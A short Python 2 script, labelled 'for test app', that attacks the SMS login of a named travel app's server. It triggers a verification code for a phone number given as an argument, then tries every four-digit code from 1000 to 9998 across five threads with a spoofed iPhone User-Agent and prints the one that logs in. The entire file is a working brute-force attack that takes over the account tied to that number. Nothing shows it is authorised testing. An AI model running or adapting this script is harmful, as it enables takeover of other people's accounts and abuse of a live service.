#!/usr/bin/env python
# coding=utf8
# author=joeyxy83@gmail.com
# create=20150414
#for test app


import json
import random
import requests
import threadpool as tp
import sys
from BeautifulSoup import BeautifulSoup 
import types


global phone,status


def checkcode(args):
    url = 'http://app6.117go.com/demo27/php/loginAction.php?submit=checkMobileCode&mobile=%s&code=%s&v=i6.0.1&vc=AppStore&vd=ae8fbfa52daac979&lang=zh-Hans' % (phone,args)
    headers = {'User-Agent':'6.0.1 rv:1537 (iPhone; iPhone OS 7.0.4; zh_CN)'}
    #GET /demo27/php/loginAction.php?submit=checkMobileCode&mobile=&code=5279&v=i6.0.1&vc=AppStore&vd=ae8fbfa52daac979&lang=zh-Hans 
    global status
    if status == 0:     
        try:
            req_result = 1             
            req = requests.get(url,headers=headers,timeout=3)
            #print req.url
            req_result = json.loads(req.content)['OK']
        except Exception,e:
            req_status = 500
            #print e
            #sys.exit(1)
        if int(req_result) == 0:
            print "phone:%s ,login code is:%s" % (phone,args) 
            status = 1


#/demo27/php/loginAction.php?lang=zh-Hans&submit=getMobileCode&mobile=15528283321&v=i6.0.1&vc=AppStore&vd=ae8fbfa52daac979---正常请求

#/demo27/php/loginAction.php?lang=zh-Hans&vc=AppStore&vd=ae8fbfa52daac979&mobile=15528283816&sumbit=getMobileCode&v=i6.0.1---不能正常请求
#坑爹的请求顺序

def send_code():
    api_url = "http://app6.117go.com/demo27/php/loginAction.php"
    payload = {'lang':'zh-Hans','vd':'ae8fbfa52daac979','vc':'AppStore','v':'i6.0.1','mobile':phone,'sumbit':'getMobileCode'}
    #submit=getMobileCode&mobile=&v=i6.0.1&vc=AppStore&vd=ae8fbfa52daac979&lang=zh-Hans 
    headers = {'User-Agent':'6.0.1 rv:1537 (iPhone; iPhone OS 7.0.4; zh_CN)'}
    url = "http://app6.117go.com/demo27/php/loginAction.php?submit=getMobileCode&mobile=%s&v=i6.0.1&vc=AppStore&vd=ae8fbfa52daac979&lang=zh-Hans" % phone
    try:
        req = requests.get(url,headers=headers,timeout=3)
        print req.url
        req_result = json.loads(req.content)['OK']
    except Exception, e:
        print e
        sys.exit(1)
    if int(req_result) == 0:
        print "code have sent" 


if __name__ == '__main__':
    args = []
    status = 0
    if len(sys.argv) != 2:
        print "usage: %s phone" % sys.argv[0]
        sys.exit(1)
    phone = sys.argv[1]    
    send_code()    
    for i in range(1000,9999):
        args.append(i)
    pool = tp.ThreadPool(5)
    reqs = tp.makeRequests(checkcode, args)
    [pool.putRequest(req) for req in reqs]
    pool.wait()
